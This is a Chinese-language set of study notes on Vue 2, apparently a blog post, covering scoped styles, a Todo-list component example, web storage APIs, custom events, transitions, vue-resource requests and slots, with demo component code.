### scoped 样式

当多个组件的样式有冲突时，以最后引入的组件的样式为最终样式（**后来者居上，样式覆盖**）

脚手架当中编写样式的技巧：

- 作用：让样式在局部生效【样式仅对当前组件生效】，防止因App组件中通过import汇总组件时样式冲突【比如**不同组件中有相同类名**等】
- 写法：`<style scoped>`
- 工作原理：
    - `scoped` 属性为每个组件生成一个**唯一的随机值**，并将这个值作为组件的属性添加到每个标签上
    - 这个随机值通常是一个**十六进制字符串**，例如 `data-v-f3f3eg9`
    - 这个属性的作用是**作为 CSS 选择器的限定符**，以防止样式冲突，例如，`h1 { color: red; }` 会被替换为 `[data-v-f3f3eg9] h1 { color: red; }`

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/21203af9440bb1afb36d3774275baf1f.png#pic_center)

注：如果在**App组件中使用scoped**，同时在App**各个组件**的模板中**也使用了组件标签**（School以及Student），那么随机属性除了会加在App组件的普通标签上之外，还会加在**组件的根标签**上，组件内部的标签是不会被加上随机属性的（蓝色绿色为组件内部标签），组件内部标签会加上**与他们组件根节点相同**的属性

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/12ba1e0f116b6ccbf771fcb94d57e369.png#pic_center)

代码：

School.vue：

```vue
<template>
  <!-- 组件的结构 -->
  <!-- <div class="School"> -->
  <div class="demo">
    <h2>学校名称：{{ name }}</h2>
    <h2>学校地址：{{ address }}</h2>
    <button @click="show">点我提示学校名称</button>
  </div>
</template>

<script>
export default {
  name: "School", 
  data() {
    return {
      name: "尚硅谷",
      address: "广东广州",
    };
  },
  methods: {
    show() {
      console.log(this);
      alert(this.name);
    },
    test(){
      this.hello()
    }
  },
};
</script>

<style scoped>
.demo {
  background-color: skyblue;
}
</style>
```

Student.vue：

```vue
<template>
  <!-- 组件的结构 -->
  <!-- <div class="student"> -->
  <div class="demo">
    <h1>{{ msg }}</h1>
    <h2>学生名称：{{ name }}</h2>
    <h2>学生年龄：{{ age }}</h2>
    <button @click="show">点我提示学生姓名</button>
  </div>
</template>

<script>
export default {
  name: "Student",
  data() {
    return {
      msg: "我是一个正在学vue的学生",
      name: "小黄",
      age: 18,
    }
  },
  methods: {
    show() {
      console.log(this);
      alert(this.name);
    },
  },
};
</script>

<style scoped>
 .demo {
  background-color: orange;
 }
</style>
<!-- 1. lang="css/less/scss/……" -->
<!-- 2. 脚手架无法处理less 需要安装less-loader -->
<!-- 指令:npm i less-loader（注意版本） -->
```

> 补充：
> 
> - lang（language）：指定css使用的编写方式【css/less/sass/scss等】，不指定lang默认就是lang=“css”
>     
> - [Less 快速入门 | Less.js 中文文档 - Less 中文网 (bootcss.com)](https://less.bootcss.com/)
>     
>     - LESS是比CSS更高一级的语言，它拥有CSS不具备的语法
>     - 特点之一：可以**嵌套**写

App.vue

```vue
<template>
  <div id="app">
    <h1> {{ msg }} </h1>
    <School/>
    <hr>
    <Student/>
  </div>
</template>

<script>
// 引入组件
import School from './components/School.vue';
import Student from './components/Student.vue';
// 后来者居上，样式覆盖（类名冲突）
// 解决：scoped 范围

export default {
  name: 'App',
  data(){
    return {
      msg:'欢迎学习vue'
    }
  },
  // 注册组件
  components: {
    Student,
    School
  },
}
</script>

<!-- 无效 -->
<!-- <style scoped> -->
<style scoped>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: rgb(56, 55, 55);
  margin-top: 60px;
}
</style>
```

### 3.5 Todo-list 案例

#### 工作情景：

1. 从0到1编写每个组件的结构和样式
    
2. 已有上一版项目的代码【HTML+CSS+JavaScript】，但不是组件化项目，需要进行改造
    
    首先将HTML中body标签内的部分全部放到App组件的模板中，然后把所有的样式也都放到App组件中，这样整个界面就出来了
    
    先拆结构，再拆样式，拆结构时一层一层的拆，因为有的组件中是包含子组件的，不要一条线走完再走其他的组件，拆出一部分结构就马上拿组件标签进行补充，然后观察界面是否与拆之前一样，如果一样，就说明拆的没问题了，然后继续拆其他部分
    

#### 组件化编码流程（通用）

1. 实现静态组件：抽取组件，使用组件实现静态页面效果
    
2. 展示动态数据：
    

​ 2.1. 数据的类型、名称是什么？

​ 2.2. 数据保存在哪个组件？

3. 交互——从绑定事件监听开始

#### 案例完成过程

##### 1. 分析布局 分组件

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/cef6765be1910c076cf415a691de67c7.png#pic_center)

##### 2. 书写静态页面

素材

###### ①. index.html

```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>React App</title>

  <link rel="stylesheet" href="index.css">
</head>
<body>
<div id="root">
  <div class="todo-container">
    <div class="todo-wrap">
      <div class="todo-header">
        <input type="text" placeholder="请输入你的任务名称，按回车键确认"/>
      </div>
      <ul class="todo-main">
        <li>
          <label>
            <input type="checkbox"/>
            <span>xxxxx</span>
          </label>
          <button class="btn btn-danger" style="display:none">删除</button>
        </li>
        <li>
          <label>
            <input type="checkbox"/>
            <span>yyyy</span>
          </label>
          <button class="btn btn-danger" style="display:none">删除</button>
        </li>
      </ul>
      <div class="todo-footer">
        <label>
          <input type="checkbox"/>
        </label>
        <span>
          <span>已完成0</span> / 全部2
        </span>
        <button class="btn btn-danger">清除已完成任务</button>
      </div>
    </div>
  </div>
</div>

</body>
</html>
```

###### ②. index.css

```css
/*base*/
body {
  background: #fff;
}

.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
  border-radius: 4px;
}

.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}

.btn-danger:hover {
  color: #fff;
  background-color: #bd362f;
}

.btn:focus {
  outline: none;
}

.todo-container {
  width: 600px;
  margin: 0 auto;
}
.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}

/*header*/
.todo-header input {
  width: 560px;
  height: 28px;
  font-size: 14px;
  border: 1px solid #ccc;
  border-radius: 4px;
  padding: 4px 7px;
}

.todo-header input:focus {
  outline: none;
  border-color: rgba(82, 168, 236, 0.8);
  box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
}

/*main*/
.todo-main {
  margin-left: 0px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding: 0px;
}

.todo-empty {
  height: 40px;
  line-height: 40px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding-left: 5px;
  margin-top: 10px;
}
/*item*/
li {
  list-style: none;
  height: 36px;
  line-height: 36px;
  padding: 0 5px;
  border-bottom: 1px solid #ddd;
}

li label {
  float: left;
  cursor: pointer;
}

li label li input {
  vertical-align: middle;
  margin-right: 6px;
  position: relative;
  top: -1px;
}

li button {
  float: right;
  display: none;
  margin-top: 3px;
}

li:before {
  content: initial;
}

li:last-child {
  border-bottom: none;
}

/*footer*/
.todo-footer {
  height: 40px;
  line-height: 40px;
  padding-left: 6px;
  margin-top: 5px;
}

.todo-footer label {
  display: inline-block;
  margin-right: 20px;
  cursor: pointer;
}

.todo-footer label input {
  position: relative;
  top: -1px;
  vertical-align: middle;
  margin-right: 5px;
}

.todo-footer button {
  float: right;
  margin-top: 5px;
}
```

##### 3. 组件拆分

###### App.vue：

```vue
<template>
  <div class="root">
      <div class="todo-container">
          <div class="todo-wrap">
              <MyHeader/>
              <MyList/>
              <MyFooter/>
          </div>
      </div>
      
      
  </div>
</template>

<script>
  import MyHeader from './components/MyHeader'
  import MyFooter from './components/MyFooter.vue'
  import MyList from './components/MyList.vue'
  import MyItem from './components/MyItem.vue'
  
  export default {
      name:'App',
      components:{MyHeader,MyFooter,MyList,MyItem},
      data(){
          return {
              msg:'欢迎学习Vue'
          }
      },
  }
</script>

<style>
  body{
      background: #fff;
  }

  .btn{
      display: inline-block;
      padding: 4px 12px;
      margin-bottom: 0;
      font-size: 14px;
      line-height: 20px;
      text-align: center;
      vertical-align: middle;
      cursor: pointer;
      box-shadow: inset 0 1px 0 rgba(255,255,255,0.2),0 1px 2px rgba(0, 0, 0, 0.05);
      border-radius: 4px;
  }

  .btn-danger{
      color: #fff;
      background-color: #da4f49;
      border: 1px solid #bd362f;
  }

  .btn-danger:hover{
      color: #fff;
      background-color: #bd362f;
  }

  .btn:focus{
      outline: none;
  }

  .todo-container{
      width: 600px;
      margin: 0 auto;
  }
  .todo-container .todo-wrap{
      padding: 10px;
      border:1px solid #ddd;
      border-radius: 5px;
  }
</style>
```

###### MyHeader.vue：

```vue
<template>
  <div class="todo-header">
      <input type="text" placeholder="请输入你的任务名称，按回车键确认">
  </div>
</template>

<script>
   export default {
       name:'MyHeader',
   }
</script>

<style scoped>
  /* header */
  .todo-header input{
      width:560px;
      height: 28px;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 4px;
      padding: 4px 7px;
  }

  .todo-header input:focus{
      outline: none;
      border-color: rgba(82, 168, 236, 0.8);
      box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075),0 0 8px rgba(82, 168, 236, 0.6);
  }
</style>
```

###### MyList.vue：

```vue
<template>
  <ul class="todo-main">
      <MyItem/>
      <MyItem/>
      <MyItem/>
  </ul>
</template>

<script>
  import MyItem from '././MyItem.vue'
  export default {
      name:'MyList',
      components:{MyItem}
  }
</script>

<style scoped>
 .todo-main{
     margin-left: 0px;
     border: 1px solid #ddd;
     border-radius: 2px;
     padding: 0px;
 }

 .todo-empty{
     height: 40px;
     line-height: 40px;
     border: 1px solid #ddd;
     border-radius: 2px;
     padding-left:5px;
     margin-top: 10px;
 }
</style>
```

###### MyItem.vue：

```vue
<template>
  <div>
      <li>
       <label >
           <input type="checkbox"/>
           <span>xxxx</span>
       </label>
       <button class="btn btn-danger" style="display:none">删除</button>
      </li>
  </div>
</template>

<script>
   export default {
       name:'MyItem',
       
   }
</script>

<style scoped>
  li{
      list-style: none;
      height: 36px;
      line-height: 36px;
      padding: 0 5px;
      border-bottom: 1px solid #ddd;
  }
  li label{
      float:left;
      cursor: pointer;
  }

  li label li input{
      vertical-align: middle;
      margin-right: 6px;
      position: relative;
      top: -1px;
  }

  li button{
      float: right;
      display: none;
      margin-top: 3px;
  }

  li:before{
      content: initial;
  }
  li:last-child{
      border-bottom: none;
  }

</style>
```

###### MyFooter.vue：

```vue
<template>
  <div class="todo-footer">
      <label>
          <input type="checkbox"/>
      </label>
      <span>
          <span>已完成0</span> / 全部2
      </span>
      <button class="btn btn-danger">清除已完成的任务</button>
  </div>
</template>

<script>
   export default {
       name:'MyFooter',
       
   }
</script>

<style scoped>
  /* Footer */
  .todo-footer {
      height: 40px;
      line-height: 40px;
      padding-left: 6px;
      margin-top: 5px;
  }
  .todo-footer label{
      display: inline-block;
      margin-right: 20px;
      cursor: pointer;
  }
  .todo-footer label input{
      position: relative;
      top: 1px;
      vertical-align: middle;
      margin-right: 5px;
  }

  .todo-footer button{
      float: right;
      margin-top: 5px;
  }
</style>
```

##### 4. 展示动态数组

数据类型：

- 数组 — 所有待办事项
- 对象 — 每件待办事项（id 内容）

##### nanoid

安装指令：`npm i nanoid`

> 不是全球唯一。。。。所有的uuid算法，都是相对于使用这个uuid算法的实例而言的！在同一个实例下不会重复（可能性极低），但是不同系统、不同算法生成的uuid还是有可能重复的！

#### 总结TodoList案例

1. 组件化编码流程：
    
    1. 拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突
    2. 实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：
        - 一个组件在用：放在组件自身即可
        - 一些组件在用：放在他们共同的父组件上（**状态提升**）
    3. 实现交互：从绑定事件开始
2. props适用于：
    
    (1).父组件 ==> 子组件 通信
    
    (2).子组件 ==> 父组件 通信（要求父先给子一个函数）
    
3. 使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为**props是不可以修改的！**
    
4. props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。
    

### webStorage【浏览器本地存储】

`localStorage`和`sessionStorage`统称为`webStorage`

#### 1. localStorage

未登录账号的情况下进行了商品搜索，搜索历史中保存了之前的搜索记录

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/7a7a7d834dd31b3ea782809d2115b25d.png#pic_center)

借助浏览器的本地存储可以将数据存到硬盘上，用于缓存数据

- 通过浏览器如何查看浏览器本地存储
    
    > 每个网站都有自己的浏览器本地存储，可以通过`浏览器开发者工具-应用-存储-本地存储空间`查看，不同浏览器查看的位置可能稍有不同，数据是以**键值对的形式**存储的
    

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/7db920b95f45ba7c82b2c8da451d229e.png#pic_center)

- 浏览器关闭数据也不会消失
- 清空浏览器缓存数据会消失

`localStorage` 用于在客户端存储持久化的数据

```html
<body>
    <h2>LocalStorage</h2>
    <button class="btn1">点击保存数据</button>
    <button class="btn2">点击读取数据</button>
    <button class="btn3">点击删除数据</button>
    <button class="btn4">点击删除所有数据</button>
    <script>
        let p={name:'小黄',age:18}
        const btn1=document.querySelector('.btn1')
        btn1.addEventListener('click',function(){
            // 键值对都是字符串（如果不是会被强转）
            window.localStorage.setItem('msg','hello!')
            window.localStorage.setItem('msg',123)//键同名会被覆盖
            window.localStorage.setItem('person',p)//[object Object]无效存储
            window.localStorage.setItem('person2',JSON.stringify(p))//	{"name":"小黄","age":18}有效存储
        })

        const btn2=document.querySelector('.btn2')
        btn2.addEventListener('click',function(){
            const msg=window.localStorage.getItem('msg')//123
            console.log(msg);

            const person2=window.localStorage.getItem('person2')
            console.log(person2);

        })

        const btn3=document.querySelector('.btn3')
        btn3.addEventListener('click',function(){
            window.localStorage.removeItem('person')
            console.log(window.localStorage.getItem('person'));//null
        })

        const btn4=document.querySelector('.btn4')
        btn4.addEventListener('click',function(){
            window.localStorage.clear()
        })
    </script>
</body>
```

#### 2. sessionStorage：

- 对于浏览器来说，会话完毕了就表示浏览器关闭了
- API完全同localStorage，浏览器只要关闭，数据就没了

```html
<body>
    <h2>sessionStorage</h2>
    <button class="btn1">点击保存数据</button>
    <button class="btn2">点击读取数据</button>
    <button class="btn3">点击删除数据</button>
    <button class="btn4">点击删除所有数据</button>
    <script>
        let p = { name: '小黄', age: 18 };
        const btn1 = document.querySelector('.btn1');
        btn1.addEventListener('click', function() {
            window.sessionStorage.setItem('msg','hello!')
            window.sessionStorage.setItem('msg',123)//键同名会被覆盖
            window.sessionStorage.setItem('person',p)//[object Object]无效存储
            window.sessionStorage.setItem('person2',JSON.stringify(p))//	{"name":"小黄","age":18}有效存储
        });

        const btn2 = document.querySelector('.btn2');
        btn2.addEventListener('click', function() {
            const msg = window.sessionStorage.getItem('msg'); // 123
            console.log(msg);

            const person2 = window.sessionStorage.getItem('person2');
            console.log(person2);

        });

        const btn3 = document.querySelector('.btn3');
        btn3.addEventListener('click', function() {
            window.sessionStorage.removeItem('person');
            console.log(window.sessionStorage.getItem('person')); // null
        });

        const btn4 = document.querySelector('.btn4');
        btn4.addEventListener('click', function() {
            window.sessionStorage.clear();
        });
    </script>
</body>
```

总结：

1. 存储内容大小一般支持5MB左右（不同浏览器可能还不一样）
    
2. 浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。
    
3. 相关API：
    
    1. `xxxxxStorage.setItem('key', 'value');`  
        该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。
        
    2. `xxxxxStorage.getItem('person');`
        
        ​ 该方法接受一个键名作为参数，返回键名对应的值。
        
    3. `xxxxxStorage.removeItem('key');`
        
        ​ 该方法接受一个键名作为参数，并把该键名从存储中删除。
        
    4. `xxxxxStorage.clear()`
        
        ​ 该方法会清空存储中的所有数据。
        
4. 备注：
    
    1. SessionStorage存储的内容会随着浏览器窗口关闭而消失。
    2. LocalStorage存储的内容，需要手动清除才会消失。
    3. `xxxxxStorage.getItem(xxx)`如果xxx对应的value获取不到，那么getItem的返回值是null。
    4. `JSON.parse(null)`的结果依然是null。

### 3.6 Vue 中的自定义事件

1. 一种组件间通信的方式，适用于：子组件 ===> 父组件
    
2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（事件的回调在A中）。
    
3. 绑定自定义事件：
    
    1. 第一种方式，在父组件中：`<Demo @atguigu="test"/>`或 `<Demo v-on:atguigu="test"/>`
        
    2. 第二种方式，在父组件中：
        
        ```js
        <Demo ref="demo"/>
        ......
        mounted(){
           this.$refs.xxx.$on('atguigu',this.test)
        }
        ```
        
    3. 若想让自定义事件只能触发一次，可以使用`once`修饰符，或`$once`方法。
        
4. 触发自定义事件：`this.$emit('atguigu',数据)`
    
5. 解绑自定义事件`this.$off('atguigu')`
    
6. 组件上也可以绑定原生DOM事件，需要使用`native`修饰符。
    
7. 注意：通过`this.$refs.xxx.$on('atguigu',回调)`绑定自定义事件时，**回调要么配置在methods中，要么用箭头函数**，否则this指向会出问题！
    

### 3.7 全局事件总线

#### 3.7.1 理解

### 3.8 消息订阅与发布

#### 3.8.1 理解

#### 3.8.2 使用PubSubJS

\1. 在线文档: https://github.com/mroderick/PubSubJS

\2. 下载: npm install -S pubsub-js

\3. 相关语法

(1) import PubSub from ‘pubsub-js’ // 引入

(2) PubSub.subscribe(‘msgName’, functon(msgName, data){ })

(3) PubSub.publish(‘msgName’, data): 发布消息, 触发订阅的回调函数调用

(4) PubSub.unsubscribe(token): 取消消息的订阅

### 3.9 过渡与动画

1. 前置知识：CSS 3 动画【2D转换、3D转换、过渡、动画】
    
    [CSS3 动画 | 菜鸟教程 (runoob.com)](https://www.runoob.com/css3/css3-animations.html)
    

#### 3.9.1 效果

```vue
<template>
  <div id="Test">
    <button @click="state">显示/隐藏</button>
    <transition name="hello">
        <h1 v-show="isShow">你好啊~</h1>
    </transition>
  </div>
</template>

<script>
export default {
  name: "Test",
  data() {
    return {
      isShow: true,
    };
  },
  methods: {
    state() {
      this.isShow = !this.isShow;
    },
  },
};
</script>

<style scoped>
h1 {
  background-color: orange;
  /* 添加过渡效果 */
  transition: transform 1s;
}

/* 定义进入时的动画 */
.hello-enter-active {
  animation: atguigu 1s forwards;
}

/* 定义离开时的动画 */
.hello-leave-active {
  animation: atguigu 1s reverse forwards;
}

@keyframes atguigu {
  from {
    transform: translateX(-100%);
  }
  to {
    transform: translateX(0px);
  }
}
</style>
```

```vue
<template>
  <div id="Test2">
    <button @click="state">显示/隐藏</button>
    <transition name="hello">
      <h1 v-show="isShow">你好啊~</h1>
    </transition>
</div>
</template>

<script>
export default {
  name: "Test2",
  data() {
    return {
      isShow: true,
    };
  },
  methods: {
    state() {
      this.isShow = !this.isShow;
    },
  },
};
</script>

<style scoped>
h1 {
  background-color: pink;
  /* transition: transform 0.5s linear; */
}

/* 定义进入和离开时共有的一些样式 */
.hello-enter-active, .hello-leave-active {
  transition: transform 0.5s linear;
}

/* 定义进入的起点和离开的终点 */
.hello-enter, .hello-leave-to {
  transform: translateX(-100%);
}

/* 定义进入的终点和离开的起点 */
.hello-enter-to, .hello-leave {
  transform: translateX(0);
}
</style>
```

**3.9.2** **vue** **动画的理解**

\1. 操作css 的trasition 或animation

\2. vue 会给目标元素添加/移除特定的class

\3. 过渡的相关类名：

\1. xxx-enter-active: 指定显示的transition

\2. xxx-leave-active: 指定隐藏的transition

\3. xxx-enter/xxx-leave-to: 指定隐藏时的样式

#### 基本过渡动画的编码

\1. 在目标元素外包裹

\2. 定义class 样式

a) 指定过渡样式: transition

b) 指定隐藏时的样式: opacity/其它

## 第 4 章：Vue 中的 ajax

### 4.1 解决开发环境 Ajax 跨域问题

使用代理服务器

**4.2** **github** **用户搜索案例**

**4.2.1** **效果**

**4.2.2** **接口地址**

https://api.github.com/search/users?q=xxx

### 4.3 vue 项目中常用的 2 个 Ajax 库

#### 4.3.1 axios

通用的Ajax 请求库, 官方推荐，使用广泛

#### 4.3.2 vue-resource

vue 插件库, vue1.x 使用广泛，**官方已不维护。**

1. 安装vue-resource
    
    ```cmd
    npm i vue-resource
    ```
    
2. 引入插件
    
    ```js
    // main.js
    
    // 引入插件vue-resource
    // vue-resource使用的是默认暴露
    import vueResource from 'vue-resource'
    ```
    
3. 使用插件
    
    ```js
    // 使用插件
    // vm和所有的vc身上都会多了一个$http
    Vue.use(vueResource)
    ```
    
4. 发送请求
    
    ```js
    this.$http.get(`https://api.github.com/search/users?q=${this.keyWord}`).then(
    response=>{
    	console.log(response.data.items)
    	this.$bus.$emit('get',{users: response.data.items, isLoading: false})
    },
    error=>{
    	console.log('请求失败了',error.message)
    	this.$bus.$emit('get',{users: [], errorMsg: error.message,isLoading: false})
    })
    ```
    

注意：vue-resource的用法、API等与axios都是相同的

### 4.4 slot 插槽

#### 4.4.1 效果

##### 效果一（不使用插槽）：

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/c78546e03ea754239357443b0fc793cd.png#pic_center)

↓ App.vue：

```vue
<template>
  <div id="app">
    <Category :listData="this.foods" title="美食"></Category>
    <Category :listData="this.games" title="游戏"></Category>
    <Category :listData="this.films" title="电影"></Category>
  </div>
</template>

<script>
import Category from "./components/Category.vue";
export default {
  name: "App",
  data() {
    return {
      foods: ["火锅", "烧烤", "小龙虾", "牛排"],
      games: ["红色警戒", "穿越火线", "劲舞团", "超级玛丽"],
      films: ["《教父》", "《拆弹专家》", "《你好，李焕英》", "《尚硅谷》"],
    };
  },
  components: {
    Category,
  },
};
</script>

<style>
#app {
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;

  display: flex;
  justify-content: space-around;
}
</style>
```

↓ Category.vue：

```vue
<template>
  <div id="Category">
    <h3>{{title}}分类</h3>
    <ul>
      <li v-for="(data,index) in listData" :key="index">{{ data }}</li>
    </ul>
  </div>
</template>

<script>
export default {
  name: "Category",
  props:['listData','title']
};
</script>

<style scoped>
#Category {
  background-color: skyblue;
  width: 200px;
  height: 300px;
}
h3 {
  background-color: orange;
}
</style>
```

##### 效果二（默认插槽）：

卖家秀效果：![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/a971f79d0c25e85bf8ddd358b5be3e44.png#pic_center)

买家秀代码（不使用插槽）：👇![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/98736e366f215e7b9c7cd88213967d4e.png#pic_center)

> 三个组件都有图片跟视频，但是由于传参与否，决定有没有正常显示

↓ App.vue：

```vue
<template>
  <div id="app">
    <Category :listData="this.foods" title="美食" :img="img">
    </Category>
    <Category :listData="this.games" title="游戏"></Category>
    <Category :listData="this.films" title="电影" :video="video">
    </Category>
  </div>
</template>

<script>
import Category from "./components/Category.vue";
export default {
  name: "App",
  data() {
    return {
      foods: ["火锅", "烧烤", "小龙虾", "牛排"],
      games: ["红色警戒", "穿越火线", "劲舞团", "超级玛丽"],
      films: ["《教父》", "《拆弹专家》", "《你好，李焕英》", "《尚硅谷》"],
      video:'http://vjs.zencdn.net/v/oceans.mp4',
      img:'https://img95.699pic.com/photo/50099/7021.jpg_wh860.jpg'
    };
  },
  components: {
    Category,
  },
};
</script>

<style>
#app {
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;

  display: flex;
  justify-content: space-around;
}
</style>
```

↓ Category.vue：

```vue
<template>
  <div id="Category">
    <h3>{{title}}分类</h3>
    <ul>
      <li v-for="(data,index) in listData" :key="index">{{ data }}</li>
    </ul>
    <img :src="img">
    <video :src="video"></video>
  </div>
</template>

<script>
export default {
  name: "Category",
  props:['listData','title','img','video']
};
</script>

<style scoped>
#Category {
  background-color: skyblue;
  width: 200px;
  height: 300px;
}
h3 {
  background-color: orange;
}
img {
  width: 150px;
  height: 100px;
}
video {
  width: 100%;
}
</style>
```

使用插槽，实现效果：👇  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/61f44eb01b67bdb52f7ac70010c52e6e.png#pic_center)  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/9e2a47f13b2125aa067c9f86c9ef27c7.png#pic_center)

↓ App.vue：

```vue
<template>
  <div id="app">
    <Category :listData="foods" title="美食">
      <img :src="img" />
    </Category>
    <Category :listData="games" title="游戏"> </Category>
    <Category :listData="films" title="电影">
      <video :src="video" controls></video>
    </Category>
  </div>
</template>
<!-- ============================================== -->
<template>
  <div id="app">
    <Category :listData="foods" title="美食">
      <ul>
        <li v-for="(food, index) in foods" :key="index">{{ food }}</li>
      </ul>
      <img :src="img" />
    </Category>
    <Category :listData="games" title="游戏">
      <ul>
        <li v-for="(game, index) in games" :key="index">{{ game }}</li>
      </ul>
    </Category>
    <Category :listData="films" title="电影">
      <ul>
        <li v-for="(film, index) in films" :key="index">{{ film }}</li>
      </ul>
      <video :src="video" controls></video>
    </Category>
  </div>
</template>
```

↓ Category.vue：

```vue
<template>
  <div id="Category">
    <h3>{{ title }}分类</h3>
    <!-- 定义插槽，默认插槽的名字是default -->
    <slot>我是一些默认值，当使用者没有传递具体结构时，我会出现</slot>
  </div>
</template>
```

> 注意：
> 
> Category组件的**标签体内容**中的**样式**写在App组件中和Category组件中有什么不同？
> 
> - Category组件的标签体内容是在App组件中解析完成后，传入到Category组件中的，所以标签体内容中的样式完全可以写在App组件中
>     
>     - App组件中：标签体内容在App组件中解析完成后带着样式传到了Category组件中
>         
>     - Category组件中：App组件直接将标签体内容传到了Category组件中，然后应用的样式
>         

##### 效果三（具名插槽）：

1. 如果在父组件App中为多个插槽提供了内容，而且没有指定这些内容应该放置到哪个具体的插槽中（直接添加多个默认插槽），那么这些内容可能会被错误地放置到默认插槽中，导致默认插槽的内容重复
    
    ```vue
    <template>
      <div id="Category">
        <h3>{{ title }}分类</h3>
        <slot>1. 我是一些默认值，当使用者没有传递具体结构时，我会出现</slot>
          <!-- 新增一个插槽↓（注意：现在还不是具名插槽，依旧是默认插槽） -->
        <slot>2. 我是具名插槽</slot>
      </div>
    </template>
    ```
    

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/443eec1b55238a4543491b207e7b1c88.png#pic_center)

2. 各自根据位置给插槽添加name属性进行区分，结果显示的都是默认插槽的内容，说明此时没有往两个插槽中添加内容
    
    ```vue
    <template>
      <div id="Category">
        <h3>{{ title }}分类</h3>
        <slot name="center">1. 我是一些默认值，当使用者没有传递具体结构时，我会出现</slot>
        <slot name="footer">2. 我是具名插槽</slot>
      </div>
    </template>
    ```
    

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/0fe778ae25a8f6c3fd5d5390b8ac3eb8.png#pic_center)

3. 使用多个插槽可以让我们更灵活地组织组件的内容，通过**具名插槽**将不同的内容放置到组件的不同部分

````
```vue
<template>
  <div id="app">
    <Category :listData="foods" title="美食">
      <!-- <ul>
        <li v-for="(food, index) in foods" :key="index">{{ food }}</li>
      </ul> -->
      <img
        src="https://img95.699pic.com/photo/50099/7021.jpg_wh860.jpg"
        slot="center"
      />
        <!-- slot属性：填坑的时候告诉Vue要给哪个坑【插槽】填东西，Vue会将slot属性所在的元素放到坑里 -->
      <a href="#" slot="footer">更多美食</a>
    </Category>
    <Category :listData="games" title="游戏">
      <ul slot="center">
        <li v-for="(game, index) in games" :key="index">{{ game }}</li>
      </ul>
      <!-- 1. 注意：空格分隔处依旧能点击跳转，非合适代码(看效果图) -->
      <!-- 往同一个坑里填多个东西，只会追加，不会覆盖 -->
	  <!-- 往同一个坑里填多个东西时，如果每个东西分开写，slot属性要写多次 -->
      <a href="#" slot="footer">单机游戏 </a>
      <a href="#" slot="footer">网络游戏</a>
    </Category>
    <Category :listData="films" title="电影">
      <!-- <ul>
        <li v-for="(film, index) in films" :key="index">{{ film }}</li>
      </ul> -->
      <video
        src="http://vjs.zencdn.net/v/oceans.mp4"
        controls
        slot="center"
      ></video>
      <!-- 2. 解决a标签跳转 使用div容器+类选择器 -->
      <!-- <div slot="footer" class="footer">
        <a href="#">经典</a>
        <a href="#">热门</a>
        <a href="#">推荐</a>
      </div>
      <h4 slot="footer">欢迎前来观影</h4> -->

      <!-- 3. 包裹多层div 换成不影响结构的template【不生成真实的DOM元素】 -->
      <!-- <template slot="footer"> -->
      <!-- 4. 具名插槽的新写法【只能用在template标签上，div上报错】【Vue2.6+ 才支持】 -->
      <template v-slot:footer>
        <template class="footer">
          <a href="#">经典</a>
          <a href="#">热门</a>
          <a href="#">推荐</a>
        </template>
        <h4>欢迎前来观影</h4>
      </template>
    </Category>
  </div>
</template>

<script>
import Category from "./components/Category.vue";
export default {
  name: "App",
  data() {
    return {
      foods: ["火锅", "烧烤", "小龙虾", "牛排"],
      games: ["红色警戒", "穿越火线", "劲舞团", "超级玛丽"],
      films: ["《教父》", "《拆弹专家》", "《你好，李焕英》", "《尚硅谷》"],
    };
  },
  components: {
    Category,
  },
};
</script>

<style scoped>
#app {
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;

  display: flex;
  justify-content: space-around;
}
.footer {
  display: flex;
  justify-content: space-around;
}
</style>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/fd55bb874ae54fcab7dbbd497dd509d0.png#pic_center)
````

- 通过**`slot`属性**将内容分配给这些具名插槽
    
    > 例如，`<img>`元素被分配给`center`插槽，而`<a>`元素被分配给`footer`插槽
    
- 如果我们向**同一个插槽**传递**多个元素**，它们会**追加**而不是覆盖
    
    > 例如，如果有多个`<a>`元素指向`footer`插槽，它们都会被渲染
    
- 为了避免创建不必要的DOM元素，我们可以使用`template`标签来包裹多个插槽内容（`template`标签不会在DOM中渲染，它只是作为一个内容分发容器）
    
- 在Vue 2.6及以上版本中，推荐使用`v-slot`指令来代替旧的`slot`和`slot-scope`属性，这使得插槽的使用更加清晰和一致
    

